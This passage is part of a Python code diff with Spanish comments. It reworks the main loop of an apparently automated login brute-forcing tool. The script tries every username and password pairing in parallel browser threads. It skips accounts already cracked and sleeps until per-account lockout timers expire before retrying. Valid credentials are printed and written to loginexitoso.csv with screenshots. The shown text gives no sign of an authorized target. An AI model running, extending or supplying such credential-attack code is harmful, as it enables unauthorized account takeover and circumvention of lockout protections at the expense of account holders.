-    log_info(f"✅ {total_combinaciones:,} combinaciones preparadas")
-    log_info(f"   ({total_usuarios_activos:,} usuarios × {total_passwords} contraseñas)")
     
     # Estadísticas
     exitosos = 0
     incorrectos = 0
     errores = 0
     saltados = 0
+    procesados_total = 0
     
     try:
-        log_info(f"\n🏁 INICIANDO PROCESAMIENTO PARALELO")
-        log_info(f"⏱️ Tiempo estimado: ~{(total_combinaciones * 8) / NUM_THREADS / 3600:.1f} horas\n")
+        log_info(f"\n🏁 INICIANDO PROCESAMIENTO (se repetirá hasta procesar todas las combinaciones)\n")
         
-        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
-            futures = {executor.submit(procesar_combinacion, tarea): tarea for tarea in tareas}
-            
-            with tqdm(total=total_combinaciones, desc="🔄 Progreso", unit="comb") as pbar:
-                for future in as_completed(futures):
-                    try:
-                        usuario_idx, password_idx, usuario, password, resultado = future.result()
-                        
-                        if resultado == "EXITOSO":
-                            exitosos += 1
-                            tqdm.write(Fore.GREEN + f"✅ EXITOSO: {usuario} | {password}")
-                        elif resultado == "INCORRECTO":
-                            incorrectos += 1
-                        elif resultado == "SALTADO":
-                            saltados += 1
-                        else:
-                            errores += 1
-                        
-                        pbar.update(1)
-                        pbar.set_postfix({
-                            'Exitosos': exitosos,
-                            'Incorrectos': incorrectos,
-                            'Saltados': saltados,
-                            'Errores': errores
-                        })
-                        
-                    except Exception as e:
-                        log_error(f"Error obteniendo resultado: {e}")
-                        pbar.update(1)
-        
+        with tqdm(total=total_combinaciones, desc="🔄 Progreso global", unit="comb") as pbar:
+            # Bucle principal que se repite hasta vaciar pending_combinations
+            while pending_combinations:
+                # Preparar lista de tareas que sí pueden intentarse ahora
+                ready = []
+                waiting_info = []
+                
+                for usuario, password in pending_combinations:
+                    with usuarios_exitosos_lock:
+                        if usuario in usuarios_exitosos:
+                            # Si usuario ya exitoso, no procesamos sus combinaciones
+                            continue
+                    puede, tiempo_restante = puede_intentar_usuario(usuario)
+                    if puede:
+                        ready.append((usuario, password))
+                    else:
+                        waiting_info.append((usuario, tiempo_restante))
+                
+                if not ready:
+                    # No hay tareas listas: calcular mínimo tiempo a esperar
+                    if waiting_info:
+                        min_remaining = min(t for u,t in waiting_info)
+                        segs = int(min_remaining) + 1
+                        minutos = segs // 60
+                        seg_extra = segs % 60
+                        log_info(f"⏳ No hay tareas listas ahora. Esperando {minutos}m {seg_extra}s hasta el próximo reintento...")
+                        time.sleep(segs)
+                        continue
+                    else:
+                        # No hay ready ni waiting_info -> tal vez todas las combinaciones correspondan a usuarios ya exitosos
+                        break
+                
+                # Dividir ready entre threads
+                chunks_tareas = distribuir_tareas_from_list(ready, NUM_THREADS)
+                
+                # Ejecutar threads (cada worker crea su driver persistente y procesa su chunk)
+                with ThreadPoolExecutor(max_workers=min(NUM_THREADS, len(chunks_tareas))) as executor:
+                    futures = {executor.submit(worker_thread, chunk): chunk for chunk in chunks_tareas}
+                    
+                    for future in as_completed(futures):
+                        try:
+                            resultados = future.result()
+                            # Procesar resultados
+                            for usuario, password, resultado in resultados:
+                                # Actualizar contadores y archivos
+                                if resultado == "EXITOSO":
+                                    exitosos += 1
+                                    procesados_total += 1
+                                    pbar.update(1)
+                                    pbar.set_postfix({
+                                        'OK': exitosos,
+                                        'Fail': incorrectos,
+                                        'Skip': saltados,
+                                        'Err': errores
+                                    })
+                                    tqdm.write(Fore.GREEN + f"✅ {usuario} | {password}")
+                                elif resultado == "INCORRECTO":
+                                    incorrectos += 1
+                                    procesados_total += 1
+                                    pbar.update(1)
+                                    pbar.set_postfix({
+                                        'OK': exitosos,
+                                        'Fail': incorrectos,
+                                        'Skip': saltados,
+                                        'Err': errores
+                                    })
+                                elif resultado == "SALTADO":
+                                    saltados += 1
+                                    procesados_total += 1
+                                    pbar.update(1)
+                                    pbar.set_postfix({
+                                        'OK': exitosos,
+                                        'Fail': incorrectos,
+                                        'Skip': saltados,
+                                        'Err': errores
+                                    })
+                                elif resultado == "ESPERANDO":
+                                    # Si el worker devolvió ESPERANDO, NO removemos la combinación de pending_combinations,
+                                    # se intentará en próximas iteraciones
+                                    log_info(f"⏳ {usuario} | {password} -> ESPERANDO (se reintentará más tarde)")
+                                else:
+                                    errores += 1
+                                    procesados_total += 1
+                                    pbar.update(1)
+                                    pbar.set_postfix({
+                                        'OK': exitosos,
+                                        'Fail': incorrectos,
+                                        'Skip': saltados,
+                                        'Err': errores
+                                    })
+                            
+                            # Después de procesar los resultados del future, eliminamos de pending las combinaciones que ya fueron procesadas
+                            # (aquí consideramos procesadas todas las combinaciones que aparecen en los resultados y no estén en estado ESPERANDO)
+                            for usuario, password, resultado in resultados:
+                                if resultado != "ESPERANDO":
+                                    # Remover todas las entradas matching (usuario,password) de pending_combinations
+                                    pending_combinations = [comb for comb in pending_combinations if not (comb[0] == usuario and comb[1] == password)]
+                                    
+                        except Exception as e:
+                            log_error(f"Error en future: {e}")
+                
+                # Al finalizar una pasada, el bucle vuelve a evaluar pending_combinations
+                # Si hay combinaciones residuales, el loop esperará el tiempo mínimo necesario en la parte inicial de la iteración
+                
         # Resumen final
         log_info("\n" + "="*70)
         log_info("📊 RESUMEN FINAL")
         log_info("="*70)
-        log_info(f"✅ Logins exitosos: {exitosos}")
-        log_info(f"❌ Logins incorrectos: {incorrectos}")
-        log_info(f"⏭️ Combinaciones saltadas (usuario ya exitoso): {saltados}")
+        log_info(f"✅ Exitosos: {exitosos}")
+        log_info(f"❌ Incorrectos: {incorrectos}")
+        log_info(f"⏭️ Saltados: {saltados}")
         log_info(f"⚠️ Errores: {errores}")
-        log_info(f"🎯 Total usuarios con credenciales válidas: {len(usuarios_exitosos)}")
-        log_info(f"📈 Total procesado: {exitosos + incorrectos + saltados + errores}")
-        log_info(f"📁 Resultados guardados en:")
-        log_info(f"   - loginExitoso.csv ({len(usuarios_exitosos)} usuarios)")
-        log_info(f"   - loginIncorrecto.csv")
-        log_info(f"   - log.txt (log completo)")
-        log_info(f"📅 Finalizado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        log_info(f"📈 Total procesado (no contando ESPERANDO que quedaron reintentándose): {procesados_total}")
+        log_info(f"\n📁 Archivos generados:")
+        log_info(f"   - loginexitoso.csv")
+        log_info(f"   - loginincorrecto.csv")
+        log_info(f"   - log.txt")
+        log_info(f"   - screenshots/ (carpeta con capturas)")
+        log_info(f"\n📅 Finalizado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         
-        # Limpiar checkpoint
-        if os.path.exists("checkpoint.txt"):
-            os.remove("checkpoint.txt")
-            
     except KeyboardInterrupt:
-        log_warning("\n⚠️ PROGRAMA INTERRUMPIDO POR EL USUARIO")
-        log_info("💾 Progreso guardado en checkpoint.txt")
-        log_info("▶️ Ejecuta nuevamente para continuar")
+        log_warning("\n⚠️ INTERRUMPIDO POR USUARIO (se detienen los reintentos en curso)")
     except Exception as e:
         log_error(f"\n❌ ERROR CRÍTICO: {e}")
     finally:
-        log_info("\n✅ PROGRAMA FINALIZADO")
+        log_info("\n🧹 Limpiando procesos Chrome...")
+        matar_procesos_chrome()
+        log_success("✅ FINALIZADO")
 
 if __name__ == "__main__":
     main()
